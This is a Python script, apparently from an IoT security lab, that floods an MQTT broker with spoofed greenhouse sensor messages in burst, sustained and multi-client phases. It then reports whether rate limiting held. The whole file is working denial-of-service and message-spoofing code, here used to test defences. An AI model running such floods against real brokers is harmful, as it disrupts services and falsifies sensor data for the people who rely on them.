"""
Denial of Service (DoS) Attack Demonstration
Floods MQTT broker with high-frequency messages to test rate limiting
"""

import asyncio
import json
import time
import logging
import random
import uuid
from datetime import datetime, timezone
from typing import Dict, Any, Optional, List
import paho.mqtt.client as mqtt
import argparse
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("attack.dos")


class DoSAttacker:
    """Demonstrates denial of service attacks against IoT infrastructure"""
    
    def __init__(self, mqtt_host: str = "mosquitto", mqtt_port: int = 1883):
        self.mqtt_host = mqtt_host
        self.mqtt_port = mqtt_port
        self.clients: List[mqtt.Client] = []
        self.attack_log = []
        self.stats = {
            'messages_sent': 0,
            'messages_failed': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Attack configuration
        self.attack_duration = 60  # 1 minute
        self.message_rate = 100  # messages per second
        self.concurrent_clients = 5  # number of concurrent MQTT clients
        self.target_sensors = ["temp-01", "humidity-01", "wind-01"]
        
    async def run_attack(self):
        """Execute the complete DoS attack demonstration"""
        logger.info("Starting DoS attack demonstration")
        
        try:
            # Phase 1: Burst attack
            await self.burst_attack_phase()
            
            # Phase 2: Sustained attack
            await self.sustained_attack_phase()
            
            # Phase 3: Concurrent client attack
            await self.concurrent_client_phase()
            
            # Phase 4: Generate report
            self.generate_report()
            
        except KeyboardInterrupt:
            logger.info("Attack demonstration interrupted by user")
        except Exception as e:
            logger.error(f"Attack demonstration failed: {e}")
        finally:
            self.cleanup()
    
    async def burst_attack_phase(self):
        """Send high-frequency message bursts"""
        logger.info(f"Phase 1: Burst attack - {self.message_rate} messages/second for 30 seconds")
        
        # Setup MQTT client
        client = mqtt.Client("dos-attacker-burst")
        client.on_connect = self._on_connect
        client.on_publish = self._on_publish
        
        # Connect
        client.connect(self.mqtt_host, self.mqtt_port, 60)
        client.loop_start()
        self.clients.append(client)
        
        # Start attack statistics
        self.stats['start_time'] = time.time()
        
        # Send burst of messages
        burst_duration = 30  # 30 seconds
        start_time = time.time()
        message_count = 0
        
        while time.time() - start_time < burst_duration:
            # Send multiple messages quickly
            for i in range(self.message_rate // 10):  # Send in batches
                sensor_id = random.choice(self.target_sensors)
                fake_message = self._create_dos_message(sensor_id)
                
                # Log attack attempt
                attack_entry = {
                    'attack_type': 'burst',
                    'timestamp': datetime.now(timezone.utc).isoformat(),
                    'sensor_id': sensor_id,
                    'message_number': message_count + 1,
                    'payload': fake_message
                }
                
                # Send message
                topic = f"greenhouse/{sensor_id}/telemetry"
                result = client.publish(topic, json.dumps(fake_message), qos=0)  # Use QoS 0 for speed
                
                if result.rc == mqtt.MQTT_ERR_SUCCESS:
                    attack_entry['status'] = 'sent'
                    self.stats['messages_sent'] += 1
                else:
                    attack_entry['status'] = 'failed'
                    self.stats['messages_failed'] += 1
                
                self.attack_log.append(attack_entry)
                message_count += 1
            
            # Small delay to control rate
            await asyncio.sleep(0.1)
        
        logger.info(f"Burst phase completed. Sent {self.stats['messages_sent']} messages")
    
    async def sustained_attack_phase(self):
        """Send sustained attack for longer duration"""
        logger.info("Phase 2: Sustained attack - moderate rate for 60 seconds")
        
        # Reduce rate for sustained attack
        sustained_rate = self.message_rate // 2
        sustained_duration = 60
        
        start_time = time.time()
        message_count = len(self.attack_log)
        
        while time.time() - start_time < sustained_duration:
            # Send messages at sustained rate
            for i in range(sustained_rate // 20):  # Send in smaller batches
                sensor_id = random.choice(self.target_sensors)
                fake_message = self._create_dos_message(sensor_id)
                
                # Log attack attempt
                attack_entry = {
                    'attack_type': 'sustained',
                    'timestamp': datetime.now(timezone.utc).isoformat(),
                    'sensor_id': sensor_id,
                    'message_number': message_count + 1,
                    'payload': fake_message
                }
                
                # Send message using existing client
                client = self.clients[0]
                topic = f"greenhouse/{sensor_id}/telemetry"
                result = client.publish(topic, json.dumps(fake_message), qos=0)
                
                if result.rc == mqtt.MQTT_ERR_SUCCESS:
                    attack_entry['status'] = 'sent'
                    self.stats['messages_sent'] += 1
                else:
                    attack_entry['status'] = 'failed'
                    self.stats['messages_failed'] += 1
                
                self.attack_log.append(attack_entry)
                message_count += 1
            
            # Delay to control sustained rate
            await asyncio.sleep(1)
        
        logger.info(f"Sustained phase completed. Total sent: {self.stats['messages_sent']} messages")
    
    async def concurrent_client_phase(self):
        """Use multiple concurrent clients for distributed attack"""
        logger.info(f"Phase 3: Concurrent client attack - {self.concurrent_clients} clients")
        
        # Create additional clients
        for i in range(1, self.concurrent_clients):
            client = mqtt.Client(f"dos-attacker-{i}")
            client.on_connect = self._on_connect
            client.on_publish = self._on_publish
            
            # Connect
            client.connect(self.mqtt_host, self.mqtt_port, 60)
            client.loop_start()
            self.clients.append(client)
            
            # Small delay between client connections
            await asyncio.sleep(0.5)
        
        # Coordinate attack across all clients
        concurrent_duration = 30
        start_time = time.time()
        message_count = len(self.attack_log)
        
        while time.time() - start_time < concurrent_duration:
            # Each client sends messages
            for client_idx, client in enumerate(self.clients):
                for i in range(5):  # Each client sends 5 messages per round
                    sensor_id = random.choice(self.target_sensors)
                    fake_message = self._create_dos_message(sensor_id)
                    
                    # Log attack attempt
                    attack_entry = {
                        'attack_type': 'concurrent',
                        'timestamp': datetime.now(timezone.utc).isoformat(),
                        'sensor_id': sensor_id,
                        'client_id': client_idx,
                        'message_number': message_count + 1,
                        'payload': fake_message
                    }
                    
                    # Send message
                    topic = f"greenhouse/{sensor_id}/telemetry"
                    result = client.publish(topic, json.dumps(fake_message), qos=0)
                    
                    if result.rc == mqtt.MQTT_ERR_SUCCESS:
                        attack_entry['status'] = 'sent'
                        self.stats['messages_sent'] += 1
                    else:
                        attack_entry['status'] = 'failed'
                        self.stats['messages_failed'] += 1
                    
                    self.attack_log.append(attack_entry)
                    message_count += 1
            
            # Delay between rounds
            await asyncio.sleep(0.5)
        
        self.stats['end_time'] = time.time()
        logger.info(f"Concurrent phase completed. Total sent: {self.stats['messages_sent']} messages")
    
    def _create_dos_message(self, sensor_id: str) -> Dict[str, Any]:
        """Create a DoS attack message"""
        return {
            'sensor_id': sensor_id,
            'ts': datetime.now(timezone.utc).isoformat(),
            'type': self._get_sensor_type(sensor_id),
            'value': self._get_fake_value(sensor_id),
            'unit': self._get_sensor_unit(sensor_id),
            'nonce': str(uuid.uuid4()),
            'enc': False,
            'ver': 1,
            'sig': f"dos_attack_{random.randint(1000, 9999)}"  # Fake signature
        }
    
    def _get_sensor_type(self, sensor_id: str) -> str:
        """Get sensor type from sensor ID"""
        if "temp" in sensor_id:
            return "temperature"
        elif "humidity" in sensor_id:
            return "humidity"
        elif "wind" in sensor_id:
            return "wind"
        return "unknown"
    
    def _get_sensor_unit(self, sensor_id: str) -> str:
        """Get sensor unit from sensor ID"""
        if "temp" in sensor_id:
            return "°C"
        elif "humidity" in sensor_id:
            return "%"
        elif "wind" in sensor_id:
            return "m/s"
        return "unit"
    
    def _get_fake_value(self, sensor_id: str) -> float:
        """Generate fake sensor value"""
        if "temp" in sensor_id:
            return round(random.uniform(20.0, 30.0), 2)
        elif "humidity" in sensor_id:
            return round(random.uniform(40.0, 80.0), 2)
        elif "wind" in sensor_id:
            return round(random.uniform(0.0, 10.0), 2)
        return 0.0
    
    def generate_report(self):
        """Generate attack report"""
        logger.info("Generating DoS attack report")
        
        # Create logs directory
        os.makedirs("logs/attacks", exist_ok=True)
        
        # Calculate attack statistics
        total_duration = self.stats.get('end_time', time.time()) - self.stats.get('start_time', time.time())
        messages_per_second = self.stats['messages_sent'] / total_duration if total_duration > 0 else 0
        
        # Analyze attack phases
        attack_phases = {}
        for entry in self.attack_log:
            phase = entry['attack_type']
            if phase not in attack_phases:
                attack_phases[phase] = {'sent': 0, 'failed': 0}
            
            if entry['status'] == 'sent':
                attack_phases[phase]['sent'] += 1
            else:
                attack_phases[phase]['failed'] += 1
        
        # Generate detailed report
        report = {
            'attack_type': 'denial_of_service',
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'summary': {
                'total_messages_sent': self.stats['messages_sent'],
                'total_messages_failed': self.stats['messages_failed'],
                'total_duration_seconds': round(total_duration, 2),
                'average_messages_per_second': round(messages_per_second, 2),
                'concurrent_clients_used': len(self.clients),
                'target_sensors': self.target_sensors,
                'attack_phases': attack_phases
            },
            'configuration': {
                'target_message_rate': self.message_rate,
                'attack_duration_seconds': self.attack_duration,
                'concurrent_clients': self.concurrent_clients,
                'mqtt_broker': f"{self.mqtt_host}:{self.mqtt_port}"
            },
            'attack_log': self.attack_log[-100:]  # Keep last 100 entries to limit file size
        }
        
        # Save report to file
        report_file = f"logs/attacks/dos_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Attack report saved to {report_file}")
        
        # Print summary
        print("\n" + "="*60)
        print("DENIAL OF SERVICE ATTACK DEMONSTRATION RESULTS")
        print("="*60)
        print(f"Total Messages Sent: {self.stats['messages_sent']}")
        print(f"Total Messages Failed: {self.stats['messages_failed']}")
        print(f"Attack Duration: {round(total_duration, 2)} seconds")
        print(f"Average Rate: {round(messages_per_second, 2)} messages/second")
        print(f"Concurrent Clients: {len(self.clients)}")
        print(f"Target Sensors: {', '.join(self.target_sensors)}")
        print("\nAttack Phases:")
        for phase, counts in attack_phases.items():
            total = counts['sent'] + counts['failed']
            print(f"  {phase}: {counts['sent']} sent, {counts['failed']} failed ({total} total)")
        print(f"\nReport File: {report_file}")
        print("\nExpected Behavior:")
        print("- With rate limiting enabled: Fog should throttle/reject excess messages")
        print("- Without rate limiting: All messages will be processed (may overwhelm system)")
        print("- Check fog service logs for rate limiting messages")
        print("- Monitor system resource usage during attack")
        print("="*60)
    
    def _on_connect(self, client, userdata, flags, rc):
        """Callback for MQTT connection"""
        if rc == 0:
            logger.debug(f"DoS client {client._client_id} connected to MQTT broker")
        else:
            logger.error(f"DoS client {client._client_id} failed to connect: {rc}")
    
    def _on_publish(self, client, userdata, mid):
        """Callback for published messages"""
        # Don't log every publish to avoid overwhelming logs
        pass
    
    def cleanup(self):
        """Cleanup resources"""
        logger.info("Cleaning up DoS attack clients")
        for client in self.clients:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass
        self.clients.clear()


async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Denial of Service Attack Demonstration")
    parser.add_argument("--mqtt-host", default="mosquitto", help="MQTT broker host")
    parser.add_argument("--mqtt-port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--rate", type=int, default=100, help="Target message rate per second")
    parser.add_argument("--clients", type=int, default=5, help="Number of concurrent clients")
    parser.add_argument("--sensors", nargs="+", default=["temp-01", "humidity-01", "wind-01"], 
                       help="Target sensor IDs")
    
    args = parser.parse_args()
    
    # Create attacker
    attacker = DoSAttacker(args.mqtt_host, args.mqtt_port)
    attacker.attack_duration = args.duration
    attacker.message_rate = args.rate
    attacker.concurrent_clients = args.clients
    attacker.target_sensors = args.sensors
    
    # Run attack
    await attacker.run_attack()


if __name__ == "__main__":
    asyncio.run(main())